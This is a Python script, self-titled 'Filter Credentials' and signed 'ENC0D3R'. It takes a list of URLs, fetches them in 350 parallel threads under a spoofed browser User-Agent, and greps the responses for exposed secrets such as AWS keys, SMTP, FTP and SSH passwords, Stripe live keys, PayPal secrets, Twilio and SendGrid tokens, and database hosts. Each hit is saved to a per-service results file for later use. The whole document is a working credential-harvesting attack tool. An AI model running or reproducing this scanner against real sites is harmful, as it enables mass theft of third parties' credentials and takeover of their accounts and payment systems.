import os, requests, time
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
from colorama import Fore, Style


def screen_clear():
    _ = os.system('cls')


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def randomsmtp (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "SMTP_" in resp:
            print(f"randomsmtp {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/randomsmtp.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} randomsmtp => {star}\n")
    except:
        pass

def ftp (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "FTP_PASS" in resp:
            print(f"ftp {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/ftp.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} ftp => {star}\n")
    except:
        pass


def ssh (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "SSH_PA" in resp:
            print(f"ssh {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/ssh.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} ssh => {star}\n")
    except:
        pass

def aws (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "AKIA" in resp:
            print(f"aws {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/aws.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} aws => {star}\n")
    except:
        pass


def awsmail (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "email-smtp" in resp:
            print(f"awsmail {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/awsmail.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} awsmail => {star}\n")
    except:
        pass

def twilio (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "TWILIO" in resp:
            print(f"twilio {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/twilio.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} twilio => {star}\n")
    except:
        pass

def office (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "office365" in resp:
            print(f"office {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/office.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} office => {star}\n")
    except:
        pass

def sendgrid (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "SG." in resp:
            print(f"sendgrid {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/sendgrid.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} sendgrid => {star}\n")
    except:
        pass     

def plivo (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "PLIVO" in resp:
            print(f"plivo {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/plivo.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} plivo => {star}\n")
    except:
        pass   

def nexmo (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "NEXMO" in resp:
            print(f"nexmo {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/nexmo.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} nexmo => {star}\n")
    except:
        pass
   
def rds (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "rds.amazonaws.com" in resp:
            print(f"rds {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/rds.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} rds => {star}\n")
    except:
        pass  


def mongodb (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "mongodb.net" in resp:
            print(f"mongodb {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/mongodb.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} mongodb => {star}\n")
    except:
        pass  


def gmail (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "smtp.gmail.com" in resp:
            print(f"gmail {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/gmail.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} gmail => {star}\n")
    except:
        pass  

def sendinblue (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "xkeysib" in resp:
            print(f"sendinblue {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/sendinblue.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} sendinblue => {star}\n")
    except:
        pass


def stripekey (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "sk_live_" in resp:
            print(f"stripekey {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/stripekey.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} stripekey => {star}\n")
    except:
        pass

def bt (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "braintree" in resp:
            print(f"Braintree {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/bt.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} braintree => {star}\n")
    except:
        pass

def paypal (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + ""
    check = requests.get(url, headers=headers, timeout=3)
    resp = check.text
    try:
        if "PAYPAL_SECRET" in resp:
            print(f"Paypal {gr}OK{res} => {star}\n")
            mrigel = open("resultsCred/paypal.txt", "a")
            mrigel.write(f'{star}\n')
        else:
            print(f"{red}Not{res} Paypal => {star}\n")
    except:
        pass

def filter(star):
    try:
       randomsmtp(star)
       ftp(star)
       ssh(star)
       aws(star)
       awsmail(star)
       twilio(star)
       office(star)
       sendgrid(star)
       plivo(star)
       nexmo(star)
       rds(star)
       mongodb(star)
       gmail(star)
       sendinblue(star)
       stripekey(star)
       paypal(star)
    except:
       pass


def main():
    print(f'''{gr}[ Filter Credentials  ] | [ BY ENC0D3R ]''')
    list = input(f"{gr}Give Me Your List.txt/{red}ENC0D3R> {gr}${res} ")
    star = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(350)
       ThreadPool.map(filter, star)
       ThreadPool.close()
       ThreadPool.join()
    except:
       pass
       
if __name__ == '__main__':
    screen_clear()
    main()